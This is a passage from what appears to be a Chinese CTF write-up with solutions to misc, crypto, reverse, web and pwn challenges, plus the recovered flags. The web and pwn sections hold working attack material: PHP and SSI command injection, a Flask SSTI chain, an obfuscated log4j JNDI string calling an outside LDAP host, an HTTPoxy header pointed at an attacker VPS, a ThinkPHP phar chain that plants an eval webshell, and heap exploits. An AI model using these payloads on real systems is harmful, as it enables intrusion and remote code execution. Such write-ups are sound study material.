77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61]
for i in s:
    print(chr(i),end=&#x27;&#x27;)</code></pre>
<p>得到base64，解码是01串，明显的二维码</p>
<pre><code class="hljs plaintext">s = &#x27;0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000&#x27;
s = s.split(&#x27;\n&#x27;)

from PIL import Image
pic = Image.new(&#x27;RGB&#x27;,(37,37),(255,255,255))
for i in range(37):
    for j in range(37):
        if(s[i][j] == &#x27;0&#x27;):
            pic.putpixel((j,i),(0,0,0))
pic.show()
pic.save(&#x27;fllllag.png&#x27;)</code></pre>
<p>扫码得到flag</p>
<pre><code class="hljs plaintext">flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125;</code></pre>
<h3 id="ez_encrypt">【ez_Encrypt】</h3>
<p>pyc的steg很明显是剑龙，注意python版本号，我用3.9没跑出来，3.6能跑</p>
<p>跑出来得到key：St3g1sV3ryFuNny</p>
<p>当然密文更明显是emoji-aes，解密得到flag</p>
<pre><code class="hljs plaintext">cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125;</code></pre>
<h3 id="ez_steg">【Ez_Steg】</h3>
<p>这次题目的流量包都只需要导出HTTP就能做了</p>
<p>导出之后有个web123，是base64，同样cyberchef解码得到zip文件，用D盾扫<img src="https://img-blog.csdnimg.cn/img_convert/fa4725c55a4a30121f2d3f40e0c9ba03.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-fxGyG6JZ-1641631822289)(mumuzi.assets/image-20220108153726810.png)]"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/85b509813a8594ab11516a7e62a893f3.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jCDmViZG-1641631822293)(mumuzi.assets/image-20220108153734258.png)]"></p>
<p>百度找一个解php混淆的，除去广告第一个就是https://www.zhaoyuanma.com/phpjm.html</p>
<p>解密得到flag<img src="https://img-blog.csdnimg.cn/img_convert/75b4fec6a65dff4e1d833ebcade21519.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-U2XyWpF1-1641631822296)(mumuzi.assets/image-20220108153841460.png)]"></p>
<pre><code class="hljs plaintext">cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;</code></pre>
<h3 id="pipicc">【pipicc】</h3>
<p>可以看到 327006.bmp 中有一片噪点，猜测是对像素点有所修改，用 010editor 打开，可以在 BITMAPLINE 结构中看到 IHDR 头，看不见 png 头，手动补上.</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7e2bf3fbf28c6aed2343f3277d07dd1c.webp?x-oss-process=image/format,png" alt=" "></p>
<p>补上以后</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3c397462c47f1d99e6689ff99a1fe757.webp?x-oss-process=image/format,png" alt=" "></p>
<p>找到IEND块，手动提取出png文件</p>
<p>得到1.png</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/61b5c5ec848727867bb12318c29fc11f.webp?x-oss-process=image/format,png" alt=" "></p>
<p>用stegsolve打开1.png提取低位数据，在蓝色的低位可以看到</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e1c15d97e7f7a97bff0ba6dd56fe7e22.webp?x-oss-process=image/format,png" alt=" "></p>
<p>d9ff，联想到jpg的文件尾，但是是倒序的，save bin提取出来得到1.bin</p>
<p>保存得到1.bin</p>
<p>搜索 d8 ff，从第一个d8 ff 开始 删掉后面的内容，然后倒序，可以用010editor的script里的stringreverse<img src="https://img-blog.csdnimg.cn/img_convert/19beb4a90516b84a93312734ae062940.webp?x-oss-process=image/format,png" alt=" "></p>
<p>得到jpg图片</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a9a8b3ed2d5f6b0438281fac31a1825a.webp?x-oss-process=image/format,png" alt="图片"></p>
<h1 id="crypto">Crypto</h1>
<h3 id="no_cry_no_can">no_cry_no_can</h3>
<p>就单纯的异或，通过格式cazy{找出key的值</p>
<pre><code class="hljs plaintext">key = b&#x27;\x5f\x11\x32\xff\x61&#x27;
s = b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;
for i in range(len(s)):
    print(chr(key[i%5]^s[i]),end=&#x27;&#x27;)</code></pre>
<pre><code class="hljs plaintext">cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;</code></pre>
<h3 id="no_can_no_bb">no_can_no_bb</h3>
<p>单纯的爆破key,给了key的范围是1,1&lt;&lt;20</p>
<pre><code class="hljs plaintext">from Crypto.Util.number import *
from Crypto.Cipher import AES
from tqdm import tqdm

def pad(m):
    tmp = 16-(len(m)%16)
    return m + bytes([tmp for _ in range(tmp)])

enc=b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;
for i in tqdm(range(1&lt;&lt;20)):
    key=pad(long_to_bytes(i))
    aes=AES.new(key,AES.MODE_ECB)
    s = aes.decrypt(enc)
    if b&#x27;cazy&#123;&#x27; in s:
        print(s)</code></pre>
<h3 id="no_math_no_cry">no_math_no_cry</h3>
<pre><code class="hljs plaintext">from Crypto.Util.number import*

import gmpy2
s = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169
s -= 0x0338470
s = gmpy2.iroot(s,2)[0]
s = -s
s += (1&lt;&lt;500)
print(long_to_bytes(s))</code></pre>
<pre><code class="hljs plaintext">cazy&#123;1234567890_no_m4th_n0_cRy&#125;</code></pre>
<h1 id="reverse">Reverse</h1>
<h3 id="combat_slogan">combat_slogan</h3>
<p>用ida打开看main就看见加密的flag了，上面函数明显的rot13</p>
<p>在线rot13解一下就行了，然后套上flag{}</p>
<pre><code class="hljs plaintext">flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</code></pre>
<h3 id="cute_doge">cute_doge</h3>
<p>IDA打开ctf1.exe，搜字符串，看见ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</p>
<p>base64解码就是flag</p>
<pre><code class="hljs plaintext">flag&#123;Ch1na_yyds_cazy&#125;</code></pre>
<h3 id="hello_py">hello_py</h3>
<pre><code class="hljs plaintext">uncompyle6 easy_py.cpython-38.pyc &gt; easy_py.py</code></pre>
<p>出来一个py文件，看了下，首先进encrypt1进行异或，再进入encrypt2进行异或，然后输出和Happy进行比较</p>
<p>既然是这样，那不妨反过来，把num从9到0改成从0到9，把该减的地方改成加，该执行的顺序也换一下。</p>
<pre><code class="hljs plaintext"># uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.7 (default, Dec 22 2020, 10:37:26) 
# [GCC 10.2.1 20201207]
# Embedded file name: C:\Users\Administrator\Desktop\easy_py.py
# Compiled at: 2021-12-28 15:45:17
# Size of source mod 2**32: 1099 bytes
import threading, time

def encode_1(n):
    global num
    while True:
        if num &lt;= 9:
            flag[num] = flag[num] ^ num
            num += 1
            time.sleep(0.1)
        if num &gt; 9:
            break


def encode_2(n):
    global num
    while True:
        if num &lt;= 9:
            flag[num] = flag[num] ^ flag[(num + 1)]
            num += 1
            time.sleep(0.1)
        if num &gt; 9:
            break


while True:
    Happy = [
     44, 100, 3, 50, 106, 90, 5, 102, 10, 112]
    num = 0
    f = input(&#x27;Please input your flag:&#x27;)
    if len(f) == 10:
        print(&#x27;Your input is illegal&#x27;)
    else:
        flag = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112]
        if(1 == 2):
            print(&#x27;crazymumuzi!&#x27;)
        else:
            print(&quot;flag to &#x27;ord&#x27;:&quot;, flag)
            t1 = threading.Thread(target=encode_1, args=(1, ))
            t2 = threading.Thread(target=encode_2, args=(2,))
            t2.start()
            t1.start()
            t1.join()
            t2.join()


        for i in flag:
            print(chr(i),end=&#x27;&#x27;)
        if flag == Happy:
            print(&#x27;Good job!&#x27;)
        else:
            print(&#x27;No no no!&#x27;)
# okay decompiling easy_py.cpython-38.pyc</code></pre>
<pre><code class="hljs plaintext">flag&#123;He110_cazy&#125;</code></pre>
<h1 id="web">Web</h1>
<h3 id="rce_no_para">【RCE_No_Para】</h3>
<p><img src="https://img-blog.csdnimg.cn/img_convert/24f8b6ee51942458e1ca88febe9090ad.png" alt="image-20220113114247702"></p>
<p><strong>正则匹配</strong><br>
<code>/[^\W]+\((?R)?\)/</code><br>
<code>\W</code> 元字符用于查找非单词字符。<br>
单词字符包括：a-z、A-Z、0-9，以及下划线。<br>
故<code>[^\W]</code>可以匹配所有单词字符<br>
<code>+</code>表示可以匹配一个或多个<br>
<code>\(</code>和<code>\)</code>为左右括号<br>
<code>(?R)?</code>表示递归整个模式</p>
<p>故本题的code只能为<code>a(b(c()))</code>这种形式，而不能为<code>a('xxx')</code>的形式，为无参数RCE</p>
<p><strong>get_defined_vars()</strong><br>
该函数可以返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/492606868e4c5b7ee1240c16d49da4cb.png" alt="image-20220113114626736"></p>
<p>当我们传入<br>
<code>code=var_dump(get_defined_vars());&amp;a=phpinfo();</code><br>
两变量时，我们自定义的变量a也出现在输出的变量中，我们便可以利用自定义的变量来绕过对code的限制进行rce<br>
我们要想取到我们自定义变量的值，就需要使用函数来获取数组中的某一个值<img src="https://img-blog.csdnimg.cn/img_convert/c9973d8e816565f1e25b5cadaaf66d18.png" alt="在这里插入图片描述"></p>
<p>我们可以在get_defined_vars()前面加一个pos()用来去掉无关的变量</p>
<pre><code class="hljs plaintext">code=var_dump(pos(get_defined_vars()));&amp;a=phpinfo();</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0b9dbb77b5c6abda4d809cd759a948eb.png" alt="image-20220113114830289"></p>
<p>如果此时再用一个pos()将会取出code的值，于是我们可以把两个变量的位置交换之后再用pos()便可以取出我们自定义变量的值</p>
<p>最终payload：<br>
<code>a=system('cat flag.php');&amp;code=eval(pos(pos(get_defined_vars())));</code><br>
在注释中找到flag</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6b5b32e9cbfc17a1386281281041897b.png" alt="image-20220113114930314"></p>
<p><em>payload：<code>?code=system(array_rand(array_flip(current(get_defined_vars()))));&amp;b=cat%09flag.php</code></em></p>
<h3 id="baby_upload">【Baby_Upload】</h3>
<p><img src="https://img-blog.csdnimg.cn/img_convert/129136b313320b1da7499de255d81832.png" alt="image-20220113120258881"></p>
<p>做这道题会发现加了对文件内容的检测，过滤了一些符号，不过不会影响正常解题，过滤了<code>ph,ini,htaccess</code>，绕过不去，可以<code>shtml</code>来利用SSI注入RCE，但是过滤了很多命令，测试发现<code>ls</code>被过滤</p>
<p><code>ls</code>被过滤可以使用<code>dir</code>来列目录：</p>
<p><code>&lt;!--#exec cmd=&quot;dir /&quot;--&gt;</code>，存为<img src="https://img-blog.csdnimg.cn/img_convert/5e1aa323a66df182405f00d7599cdd92.png" alt="image-20220113120501689"></p>
<p><code>1.shtml</code>之后上传，列出根目录，得知flag在<code>fffffflllll11111aaaaa4444ggggg</code>下，可以构造出：</p>
<p><code>&lt;!--#exec cmd=&quot;cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg&quot;--&gt;</code></p>
<p>（强调一下，这里使用？是因为fl被过滤了，用？来匹配）</p>
<p>来读取文件，存为<code>2.shtml</code>后上传获得flag。<img src="https://img-blog.csdnimg.cn/img_convert/ae7a40536e23ee7973c69e279960cef7.png" alt="image-20220113120703608"></p>
<h3 id="flask">【flask】</h3>
<p>访问主页发现注释中有提示</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/723a664982706e4eb3f98e5b1b33192b.webp?x-oss-process=image/format,png" alt=" "></p>
<p>/admin  /static.js  一段python代码 此段代码为后端的URL Filter 当请求js类静态文件时不需要认证，而在请求其他路径时则会被重定向到login 在flask的官方文档中</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7a550f751b0424e53280b3976be4cdf7.webp?x-oss-process=image/format,png" alt=" "></p>
<p>在请求http://localhost/admin?test=123</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bf88a237bdc35899db9ffb34c2c18d04.webp?x-oss-process=image/format,png" alt=" "></p>
<p>而请求/admin;xxx=1&amp;test=123</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9fdf2034e8c6864b35616401982f53ec.webp?x-oss-process=image/format,png" alt=" "></p>
<p>对<code>request.path</code> 来说其值为<code>/admin;xxx=1</code>并没有把<code>path parameter</code>去掉，在代码中的判断使用的是<code>request.full_path</code><br>
而在<code>request.full_path</code>中是包含了<code>query string</code>因此只要发起这样的请求：随意增加一个参数，并且参数值是以.js?结尾即可绕过校检<code>/admin?xxx=.js?</code>这里不能用<code>;</code>的原因是<code>request.path</code>并没有去掉 <code>path parameter</code> 在没有带上<code>query string</code>的情况下<code>full_path：/admin;x=.js?</code>满足<code>.js?</code>而<code>request.path:/admin;x=.js</code>路由表中没有<code>admin;x=.js</code>从而404</p>
<p>进入之后就是常规的ssti绕沙箱</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5146359cd1f86ddf4d5dbd6f2c9d8b1a.webp?x-oss-process=image/format,png" alt=" "></p>
<pre><code class="hljs plaintext">aa:__class__ 
bb:__mro__
cc:__subclasses__
dd:__init__
ee:__globals__</code></pre>
<p><code>((((request|attr(request.cookies.get('aa'))|attr(request.cookies.get('bb'))|list).pop(-1)|attr(request.cookies.get('cc'))()).pop(117)|attr(request.cookies.get('dd'))|attr(request.cookies.get('ee'))).get('popen')('ls').read())</code></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/c9801d185e8c4c2cffc019efff18c473.webp?x-oss-process=image/format,png" alt=" "></p>
<p>个人实践后发现貌似得到不了flag，也不知道原因在哪，下面是我的做题截图<img src="https://img-blog.csdnimg.cn/img_convert/8091f4f3ec63390e6622b3aba55baf4e.png" alt="image-20220115174547552"></p>
<p>请知道问题所在的大佬在评论区留言，谢谢</p>
<h3 id="shiro">【Shiro?】</h3>
<p>虽然登录界面伪造了一个shiro反序列化漏洞，但是实际漏洞点是在登录处的log4j2RCE漏洞。起一个ldap服务用于加载恶意类。运行环境Java版本较高需要bypass，即可正常攻击，可利用JNDIExploit工具进行攻击。用{::-n}等规则替换关键字和ip地址即可绕过规则， 也可用woodpecker生成payload， 在登录点username处输入payload即可</p>
<pre><code class="hljs plaintext">$&#123;$&#123;kBQ:aUR:j:-j&#125;$&#123;MoYvsH:XAND:kG:-n&#125;$&#123;EdAUxY:ck:pyjko:RIasA:-d&#125;$&#123;hNhKmh:E:c:-i&#125;$&#123;l:MLjM:-:&#125;$&#123;qvO:STYFpz:ufnqW:V:-l&#125;$&#123;G:mIWH:-d&#125;$&#123;er:WLe:J:Pl:kCih:-a&#125;$&#123;yHjTcA:FM:e:IktQAC:-p&#125;$&#123;bvaWm:WW:-:&#125;$&#123;kB:hGD:GPI:-/&#125;$&#123;GC:VOUh:dqINYx:FK:n:-/&#125;$&#123;v:KHSOc:-1&#125;$&#123;Li:-9&#125;$&#123;QtYkc:o:CQBzJl:D:-2&#125;$&#123;KmJs:oJznyf:oIDrB:zmdK:-.&#125;$&#123;F:ttejsH:k:rI:-1&#125;$&#123;gN:-6&#125;$&#123;tB:aJqxS:-8&#125;$&#123;arq:J:wcas:d:-.&#125;$&#123;rh:Rcz:-2&#125;$&#123;z:Gvz:-.&#125;$&#123;F:-2&#125;$&#123;IsgAtf:-3&#125;$&#123;CPsF:QRLx:dICC:rMp:-8&#125;$&#123;o:Kk:hmhWl:XjIbnJ:-:&#125;$&#123;kp:-1&#125;$&#123;PeOoN:Y:mIFi:-3&#125;$&#123;P:-8&#125;$&#123;YMhc:EJ:uD:Wwytb:-9&#125;$&#123;OLPfY:YTvJf:m:OXdV:-/&#125;$&#123;rf:Uagil:PDiuPH:-T&#125;$&#123;PBKgU:NhAyi:MpIN:-o&#125;$&#123;awgT:-m&#125;$&#123;aS:TCt:xnzwfF:UNaIr:Ppp:-c&#125;$&#123;II:kNl:uHtTJi:WXfR:UjzJC:-a&#125;$&#123;jBHdVl:PB:-t&#125;$&#123;bkgfV:sYiJoF:uBIIDN:-B&#125;$&#123;WROI:-y&#125;$&#123;U:F:GAnUD:-p&#125;$&#123;nQMY:-a&#125;$&#123;yqYF:-s&#125;$&#123;cVWi:rs:NFv:f:wmqbfG:-s&#125;$&#123;XjHqnt:sP:uSjj:dWkcba:njEm:-/&#125;$&#123;CY:-T&#125;$&#123;qeW:-o&#125;$&#123;tLipT:GjC:YGc:-m&#125;$&#123;WmRvEy:pIxR:ur:LroYD:woOzUb:-c&#125;$&#123;ye:d:sR:NsdI:-a&#125;$&#123;OyXQBo:KSC:blRvH:iMLj:DxG:-t&#125;$&#123;MOGEk:VnN:-E&#125;$&#123;nxrEv:dKbcF:iEWJOf:-c&#125;$&#123;Jd:GTm:rJ:KsWYpp:oz:-h&#125;$&#123;UjBT:hMh:-o&#125;&#125;

$&#123;j$&#123;iqV:xQtVwM:-n&#125;d$&#123;WnFLI:-i&#125;$&#123;j:YxXkbc:QpCi:k:QA:-:&#125;$&#123;tuNJ:pa:vDTPc:-l&#125;dap:$&#123;mxyDc:-/&#125;/$&#123;X:A:wJfVUX:-1&#125;$&#123;u:si:TmOs:-9&#125;2$&#123;x:DGbnfN:-.&#125;$&#123;h:Ga:H:Gmiv:zYQf:-1&#125;6$&#123;dqV:KYvLFD:Edfgq:HzKoK:-8&#125;$&#123;KNzKwB:IEJiU:-.&#125;$&#123;QMgb:NTVFr:gM:-2&#125;.2$&#123;VPb:kgVqX:vMNFgF:EV:iyt:-3&#125;8:1$&#123;nOhh:uTaV:TlMnJ:J:FM:-3&#125;$&#123;zUKT:mVGhb:RHbf:ypvu:-8&#125;$&#123;y:bPcT:g:Ya:-9&#125;$&#123;EDXJQ:Eetclr:oSVeHz:J:-/&#125;To$&#123;GbLFYe:UpYi:-m&#125;cat$&#123;UaV:Mo:Fu:UDboa:ePDD:-B&#125;$&#123;uzqh:O:lxU:UFRpQk:gGbqT:-y&#125;p$&#123;l:pJeje:P:s:vjiPI:-a&#125;$&#123;LCJ:vM:Ebt:LJmS:-s&#125;$&#123;pXuvuL:oWk:kXTgAe:kml:-s&#125;$&#123;WbhDYc:u:Ne:Slcje:-/&#125;$&#123;M:-T&#125;omc$&#123;kBm:V:iVQ:-a&#125;$&#123;cYCt:-t&#125;$&#123;iGHgwi:I:-E&#125;cho&#125;</code></pre>
<h3 id="flag配送中心">【Flag配送中心】</h3>
<p>HTTPoxy漏洞（CVE-2016-5385）</p>
<p>VPS上监听对应端口后，在HTTP请求包中添加Proxy头：</p>
<pre><code class="hljs plaintext">Proxy: http://VPS:POST/</code></pre>
<p>即可监听到Flag</p>
<h3 id="tp">【tp】</h3>
<p><code>thinkphp5.0.24</code> 反序列化</p>
<p>通过网上<code>poc</code> 生成<code>phar</code> 文件后，上传</p>
<p>然后变量覆盖，传入：<code>?FILES\[file\]\[name\]=phar://【上传的phar 文件名】</code></p>
<p>触发<code>phar</code> 反序列化，生成<code>webshell</code></p>
<p><strong>生成phar 的poc</strong></p>
<pre><code class="hljs plaintext">&lt;?php
namespace think\process\pipes &#123;
    class Windows &#123;
        private $files = [];

        public function __construct($files)
        &#123;
            $this-&gt;files = [$files]; 
        &#125;
    &#125;
&#125;

namespace think &#123;
    abstract class Model&#123;
        protected $append = [];
        protected $error = null;
        public $parent;

        function __construct($output, $modelRelation)
        &#123;
            $this-&gt;parent = $output; 
            $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;);    
            $this-&gt;error = $modelRelation;   
        &#125;
    &#125;
&#125;

namespace think\model&#123;
    use think\Model;
    class Pivot extends Model&#123;
        function __construct($output, $modelRelation)
        &#123;
            parent::__construct($output, $modelRelation);
        &#125;
    &#125;
&#125;

namespace think\model\relation&#123;
    class HasOne extends OneToOne &#123;

    &#125;
&#125;
namespace think\model\relation &#123;
    abstract class OneToOne
    &#123;
        protected $selfRelation;
        protected $bindAttr = [];
        protected $query;
        function __construct($query)
        &#123;
            $this-&gt;selfRelation = 0;
            $this-&gt;query = $query;    //$query指向Query
            $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $value值，作为call函数引用的第二变量
        &#125;
    &#125;
&#125;

namespace think\db &#123;
    class Query &#123;
        protected $model;

        function __construct($model)
        &#123;
            $this-&gt;model = $model; //$this-&gt;model=&gt; think\console\Output;
        &#125;
    &#125;
&#125;
namespace think\console&#123;
    class Output&#123;
        private $handle;
        protected $styles;
        function __construct($handle)
        &#123;
            $this-&gt;styles = [&#x27;getAttr&#x27;];
            $this-&gt;handle =$handle; //$handle-&gt;think\session\driver\Memcached
        &#125;

    &#125;
&#125;
namespace think\session\driver &#123;
    class Memcached
    &#123;
        protected $handler;

        function __construct($handle)
        &#123;
            $this-&gt;handler = $handle; //$handle-&gt;think\cache\driver\File
        &#125;
    &#125;
&#125;

namespace think\cache\driver &#123;
    class File
    &#123;
        protected $options=null;
        protected $tag;

        function __construct()&#123;
            $this-&gt;options=[
                &#x27;expire&#x27; =&gt; 3600,
                &#x27;cache_subdir&#x27; =&gt; false,
                &#x27;prefix&#x27; =&gt; &#x27;&#x27;,
                &#x27;path&#x27;  =&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../../../../../../../../../../var/www/html/&#x27;,
                &#x27;data_compress&#x27; =&gt; false,
            ];
            $this-&gt;tag = &#x27;xxx&#x27;;
        &#125;

    &#125;
&#125;

namespace &#123;
    $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());
    $Output = new think\console\Output($Memcached);
    $model = new think\db\Query($Output);
    $HasOne = new think\model\relation\HasOne($model);
    $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));

    $phar = new Phar(&quot;phar.phar&quot;); 
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
    $phar-&gt;setMetadata($window);        
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);        
    $phar-&gt;stopBuffering();
&#125;</code></pre>
<h1 id="pwn">Pwn</h1>
<h3 id="pwn1">【pwn1】</h3>
<p>pwn签到题，唯一有点坑就是在出函数时并不仅仅是leave；ret，而是多出了两行汇编代码。因此需要我们分析和调试一下。<img src="https://img-blog.csdnimg.cn/img_convert/cf6510bae78f50b6ac5c90f25444c0a7.webp?x-oss-process=image/format,png" alt="图片"></p>
<p>exp</p>
<pre><code class="hljs plaintext">from pwn import *
io=process(&#x27;pwn1&#x27;)
io.recvuntil(&quot;:&quot;)
stack = int(io.recv(10),16)
gdb.attach(io)
io.sendline(&#x27;a&#x27;*0x30+p32(0x8048540)+p32(stack+0x34))
io.interactive()</code></pre>
<h3 id="pwn2">【pwn2】</h3>
<p>libc-2.27的off-by-one，细心一点就能发现for循环这块会让我们多输入一个字节。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/75e187221d88fa32723525ed32f18090.webp?x-oss-process=image/format,png" alt="图片"></p>
<p>exp</p>
<pre><code class="hljs plaintext">from pwn import *
io=process(&#x27;./pwn2&#x27;)
elf=ELF(&#x27;./pwn2&#x27;)
libc=elf.libc
#libc=ELF(&#x27;./libc-2.27.so&#x27;)
context.log_level=&#x27;debug&#x27;

def add(size,content):
 io.sendlineafter(&#x27;Choice: &#x27;,&#x27;1&#x27;)
 io.sendlineafter(&#x27;size: &#x27;,str(size))
 io.sendafter(&#x27;content: &#x27;,content)

def edit(index,content):
 io.sendlineafter(&#x27;Choice: &#x27;,&#x27;2&#x27;)
 io.sendlineafter(&#x27;idx: &#x27;,str(index))
 io.sendlineafter(&#x27;content: &#x27;,content)

def dele(index):
 io.sendlineafter(&#x27;Choice: &#x27;,&#x27;3&#x27;)
 io.sendlineafter(&#x27;idx: &#x27;,str(index))

def show(index):
 io.sendlineafter(&#x27;Choice: &#x27;,&#x27;4&#x27;)
 io.sendlineafter(&#x27;idx: &#x27;,str(index))

def exp():
 add(0xf8,&#x27;f1ag\n&#x27;)#0
 add(0xf8,&#x27;f1ag\n&#x27;)#1
 add(0xf8,&#x27;f1ag\n&#x27;)#2
 add(0xf8,&#x27;f1ag\n&#x27;)#3
 add(0x18,&#x27;f1ag\n&#x27;)#4
 dele(2)
 add(0xf8,&#x27;a&#x27;*0xf0+p64(0x300)+&#x27;\n&#x27;)#2

 for i in range(7):
  add(0xf8,&#x27;a\n&#x27;)#5~11
 for i in range(7):
  dele(11-i)
 
 dele(0)
 gdb.attach(io)
 dele(3)
 for i in range(7):
  add(0xf8,&#x27;f1ag\n&#x27;)#0,3,5~9
 add(0xf8,&#x27;f1ag\n&#x27;)#10
 show(1)
 malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16
 libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]
 print(&#x27;libc_base&#x27;,hex(libc_base))
 free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base
 system = libc.symbols[&#x27;system&#x27;] + libc_base

 add(0xf8,&#x27;f1ag\n&#x27;)#11=1
 dele(1)
 edit(11,p64(free_hook-8)+&#x27;\n&#x27;)
 add(0xf8,&#x27;f1ag\n&#x27;)#1
 add(0xf8,&#x27;/bin/sh\x00&#x27;+p64(system)+&#x27;\n&#x27;)#12
 dele(12)
 io.interactive()
exp()</code></pre>
<h3 id="pwn3">【pwn3】</h3>
<p>这个题利用的是strcpy、strcat等一些对字符串操作的函数的漏洞，当他们复制字符串的时候会把字符串的最后一个字节\x00给带上，极容易造成off-by-null漏洞。而这个题的漏洞点正在于此，\x00正好将存放长度的地址覆盖置0，就可以将长度的值改写为一个很大的值，打败boss进入到奖励函数中。<img src="https://img-blog.csdnimg.cn/img_convert/3a7ba0bb6709a77fb33cb50426c820ec.webp?x-oss-process=image/format,png" alt="图片"></p>
<p>因为有exit函数，很容易联想到打exit_hook。[exit_hook的知识点]( PWN学习—exit_hook-偷家 - BlackBird’s Blog (<a target="_blank" rel="noopener" href="http://blackbird-bb.github.io">blackbird-bb.github.io</a>) ) 参考这位西电大佬写的博客，然后直接打onegadget就ok了。在打one_gadget的时候正常出来的四个gadget不能打通，这时候在one_gadget后加上-l2可以找到更多的gadget。</p>
<p>exp</p>
<pre><code class="hljs plaintext">from pwn import *
#io=process(&#x27;./Gpwn3&#x27;)
io=remote(&#x27;127.0.0.1&#x27;,10002)
elf=ELF(&#x27;./Gpwn3&#x27;)
libc=ELF(&#x27;./libc-2.23.so&#x27;)
context.log_level=&#x27;debug&#x27;

def create(description):
 io.sendlineafter(&#x27;choice:&#x27;,&#x27;1&#x27;)
